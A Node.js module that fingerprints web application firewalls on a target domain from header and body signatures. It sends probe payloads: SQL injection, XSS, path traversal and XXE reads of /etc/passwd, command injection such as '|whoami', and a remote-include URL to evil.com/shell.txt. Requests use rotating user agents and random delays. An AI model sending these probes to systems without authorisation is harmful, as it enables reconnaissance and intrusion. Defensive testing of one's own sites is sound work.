const https = require('https');
const http = require('http');

class WAFChecker {
    constructor() {
        this.signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare-nginx', '__cfduid', 'cf-cache-status', 'cf-request-id'],
            'AWS Shield': ['x-amzn-requestid', 'x-amz-cf-id', 'server: cloudfront', 'x-amz-id'],
            'Akamai': ['akamai-ghost', 'x-akamai-', 'ak-', 'akamai-edge'],
            'Incapsula': ['x-iinfo', 'incap_ses', 'visid_incap', 'incapsula'],
            'Sucuri': ['x-sucuri-id', 'x-sucuri-cache', 'sucuri', 'x-sucuri-proxy'],
            'ModSecurity': ['mod_security', 'modsecurity', 'blocked by mod_security'],
            'F5 BIG-IP': ['bigipserver', 'f5-bigip', 'x-wa-info', 'f5-ltm'],
            'Barracuda': ['barra', 'cuda', 'bfw', 'barracuda'],
            'FortiWeb': ['fortigate', 'fortinet', 'fortiwafd', 'fortiweb'],
            'Imperva': ['x-iinfo', 'imperva', 'incap', 'x-imperva'],
            'Wordfence': ['wordfence', 'wfwaf', 'x-wf-'],
            'DDoS-Guard': ['ddos-guard', 'x-ddos-protection'],
            'StackPath': ['stackpath', 'x-sp-'],
            'KeyCDN': ['keycdn', 'x-edge-'],
            'Fastly': ['fastly', 'x-served-by', 'x-cache: hit'],
            'MaxCDN': ['maxcdn', 'x-pull'],
            'Neustar': ['neustar', 'ultradns'],
            'CacheFly': ['cachefly', 'x-cf-'],
            'Section.io': ['section.io', 'x-section-'],
            'Varnish': ['varnish', 'x-varnish', 'via: varnish']
        };
        
        this.testPayloads = [
            "?id=1' OR '1'='1",
            "?search=<script>alert(123)</script>",
            "?file=../../../etc/passwd",
            "?cmd=cat%20/etc/passwd",
            "?test=javascript:alert(1)",
            "?payload=UNION SELECT * FROM users",
            "?xss=\"><img src=x onerror=alert(1)>",
            "?lfi=../../../../windows/system32/drivers/etc/hosts",
            "?rfi=http://evil.com/shell.txt",
            "?sqli=' UNION SELECT user,password FROM mysql.user--",
            "?xxe=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "?rce=;cat /etc/passwd;",
            "?cmd=|whoami",
            "?dir=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ];
    }

    async checkWAF(domain, useSSL = true) {
        const protocol = useSSL ? 'https' : 'http';
        const results = {
            detected: [],
            responses: [],
            likely_protected: false,
            response_patterns: []
        };

        console.log('verific firewall aplicatie web...');
        
        try {
            const normalReq = await this.makeRequest(`${protocol}://${domain}/`);
            results.responses.push({ type: 'normal', status: normalReq.statusCode });
            
            this.analyzeHeaders(normalReq.headers, results);

            for (let i = 0; i < Math.min(this.testPayloads.length, 8); i++) {
                const payload = this.testPayloads[i];
                try {
                    const testReq = await this.makeRequest(`${protocol}://${domain}/${payload}`);
                    results.responses.push({ 
                        type: 'payload', 
                        status: testReq.statusCode, 
                        payload: payload.substring(0, 30) 
                    });
                    
                    if (testReq.statusCode === 403 || testReq.statusCode === 406 || 
                        testReq.statusCode === 418 || testReq.statusCode === 429 || 
                        testReq.statusCode === 444 || testReq.statusCode === 499) {
                        results.likely_protected = true;
                    }
                    
                    this.analyzeHeaders(testReq.headers, results);
                    this.analyzeBody(testReq.body, results);
                    
                } catch (e) {
                    if (e.message.includes('403') || e.message.includes('blocked')) {
                        results.likely_protected = true;
                    }
                    continue;
                }
                
                await this.sleep(Math.random() * 800 + 400);
            }
            
        } catch (e) {
            console.log(`verifiare waf nereusita: ${e.message.substring(0, 50)}...`);
        }

        return results;
    }

    analyzeHeaders(headers, results) {
        const headerString = JSON.stringify(headers).toLowerCase();
        
        for (let [waf, sigs] of Object.entries(this.signatures)) {
            for (let sig of sigs) {
                if (headerString.includes(sig.toLowerCase())) {
                    if (!results.detected.includes(waf)) {
                        results.detected.push(waf);
                    }
                }
            }
        }
        
        const protectionHeaders = [
            'x-frame-options',
            'x-xss-protection', 
            'x-content-type-options',
            'strict-transport-security',
            'content-security-policy',
            'x-permitted-cross-domain-policies',
            'referrer-policy'
        ];
        
        for (let header of protectionHeaders) {
            if (headers[header]) {
                results.response_patterns.push(`${header}: ${headers[header]}`);
            }
        }
    }

    analyzeBody(body, results) {
        if (!body || typeof body !== 'string') return;
        
        const bodyLower = body.toLowerCase();
        const wafPatterns = [
            { pattern: 'access denied', waf: 'Generic WAF' },
            { pattern: 'blocked by security', waf: 'Security Filter' },
            { pattern: 'suspicious activity', waf: 'Threat Detection' },
            { pattern: 'request blocked', waf: 'Request Filter' },
            { pattern: 'security violation', waf: 'Security System' },
            { pattern: 'firewall', waf: 'Web Firewall' },
            { pattern: 'rate limit exceeded', waf: 'Rate Limiter' },
            { pattern: 'cloudflare', waf: 'Cloudflare' },
            { pattern: 'incapsula', waf: 'Incapsula' },
            { pattern: 'imperva', waf: 'Imperva' },
            { pattern: 'sucuri', waf: 'Sucuri' },
            { pattern: 'wordfence', waf: 'Wordfence' },
            { pattern: 'mod_security', waf: 'ModSecurity' },
            { pattern: 'forbidden', waf: 'Access Control' },
            { pattern: 'not acceptable', waf: 'Content Filter' },
            { pattern: 'malicious request', waf: 'Threat Filter' },
            { pattern: 'attack detected', waf: 'Attack Prevention' },
            { pattern: 'security alert', waf: 'Security Monitor' }
        ];

        for (let wafCheck of wafPatterns) {
            if (bodyLower.includes(wafCheck.pattern)) {
                results.likely_protected = true;
                if (!results.detected.includes(wafCheck.waf)) {
                    results.detected.push(wafCheck.waf);
                }
            }
        }
        
        const errorCodes = ['error 403', 'error 406', 'error 418', 'error 429'];
        for (let errorCode of errorCodes) {
            if (bodyLower.includes(errorCode)) {
                results.likely_protected = true;
                break;
            }
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    makeRequest(url, timeout = 12000) {
        return new Promise((resolve, reject) => {
            const client = url.startsWith('https') ? https : http;
            const userAgents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
            ];
            
            const options = {
                timeout: timeout,
                headers: {
                    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
            };

            const req = client.get(url, options, (res) => {
                let data = '';
                res.on('data', chunk => {
                    try {
                        data += chunk.toString();
                    } catch (e) {
                        data += chunk;
                    }
                });
                res.on('end', () => {
                    resolve({
                        statusCode: res.statusCode,
                        headers: res.headers,
                        body: data
                    });
                });
            });

            req.on('error', (err) => {
                reject(err);
            });
            
            req.on('timeout', () => {
                req.destroy();
                reject(new Error('request timeout'));
            });
            
            req.setTimeout(timeout, () => {
                req.destroy();
                reject(new Error('connection timeout'));
            });
        });
    }
}

module.exports = { WAFChecker };

